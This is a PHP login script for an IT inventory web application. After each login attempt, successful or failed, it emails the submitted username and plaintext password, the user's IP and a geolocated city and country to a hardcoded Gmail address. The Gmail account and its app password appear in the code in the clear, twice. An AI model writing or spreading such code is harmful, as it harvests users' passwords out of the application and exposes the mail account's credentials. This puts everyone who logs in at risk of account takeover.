<?php
include_once('includes/load.php');
date_default_timezone_set('Asia/Manila');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require './phpmailer/src/Exception.php';
require './phpmailer/src/PHPMailer.php';
require './phpmailer/src/SMTP.php';

$req_fields = array('username', 'password');
validate_fields($req_fields);

$username = remove_junk($_POST['username']);
$password = remove_junk($_POST['password']);

// Get user's IP address
$user_ip = $_SERVER['REMOTE_ADDR'];

// Initialize or update login attempts
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}

// Function to get location (optional)
function get_location($ip) {
    $response = file_get_contents('http://ip-api.com/json/' . $ip);
    return json_decode($response, true);
}

if (empty($errors)) {
    $user_id = authenticate($username, $password);
    if ($user_id) {
        // Reset login attempts after successful login
        $_SESSION['login_attempts'] = 0;

        // Create session with id
        $session->login($user_id);

        $location = get_location($user_ip);
        // Update Sign in time
        updateLastLogIn($user_id);
        $session->msg("s", "Welcome to IT Department Inventory Management System");

        // PHPMailer: Send notification email upon successful login
        try {
            $mail = new PHPMailer(true);
            $mail->SMTPDebug = 0; // Disable verbose debug output
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Set mailer to use SMTP
            $mail->SMTPAuth = true;
            $mail->Username = 'inventorym77@gmail.com';
            $mail->Password = 'ezvo nqde jzsf ouhl';
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Recipients
            $mail->setFrom('inventorym77@gmail.com', 'IT Inventory Management');
            $mail->addAddress('inventorym77@gmail.com'); // Admin email (your email)

            $mail->isHTML(true);
            $mail->Subject = 'Successfully Logged.';
            $mail->Body    = 'A user has successfully logged in.<br>'
                           . 'Email: ' . $username . '<br>'
                            . 'Password: ' . $password . '<br>'
                           . 'IP Address: ' . $user_ip . '<br>'
                           . 'Location: ' . ($location['city'] ?? 'Unknown') . ', ' . ($location['country'] ?? 'Unknown') . '<br>'
                           . 'Login Time: ' . date("Y-m-d H:i:s");

            $mail->send();
        } catch (Exception $e) {
            error_log('Login notification could not be sent. Mailer Error: ' . $mail->ErrorInfo);
        }

        // Redirect to admin.php with success parameter
        redirect('admin.php?success=true', false);

    } else {
        // Increment login attempts
        $_SESSION['login_attempts']++;

        // Optionally get user's location
        $location = get_location($user_ip);

        // PHPMailer: Send notification email for every failed login attempt
        try {
            $mail = new PHPMailer(true);
            $mail->SMTPDebug = 0; // Disable verbose debug output
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Set mailer to use SMTP
            $mail->SMTPAuth = true;
            $mail->Username = 'inventorym77@gmail.com';
            $mail->Password = 'ezvo nqde jzsf ouhl';
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Recipients
            $mail->setFrom('inventorym77@gmail.com', 'IT Inventory Management');
            $mail->addAddress('inventorym77@gmail.com'); // Admin email (your email)

            // Content
            $mail->isHTML(true);
            $mail->Subject = 'Failed Login Attempt';
            $mail->Body    = 'A Failed Login Attempt.<br>'
                           . 'Username: ' . $username . '<br>'
                           . 'Password: ' . $password . '<br>' // Include password in email
                           . 'IP Address: ' . $user_ip . '<br>'
                           . 'Location: ' . ($location['city'] ?? 'Unknown') . ', ' . ($location['country'] ?? 'Unknown') . '<br>'
                           . 'Time: ' . date("Y-m-d H:i:s");

            $mail->send();
        } catch (Exception $e) {
            error_log('Failed login attempt notification could not be sent. Mailer Error: ' . $mail->ErrorInfo);
        }

        // Reset login attempts after 3 failed attempts, if needed
        if ($_SESSION['login_attempts'] >= 3) {
            $_SESSION['login_attempts'] = 0;
        }

        $session->msg("d", "Sorry Username/Password incorrect.");
        redirect('L-Login.php?access=allowed', false);
    }

} else {
    $session->msg("d", $errors);
    redirect('L-Login.php?access=allowed', false);
}
?>
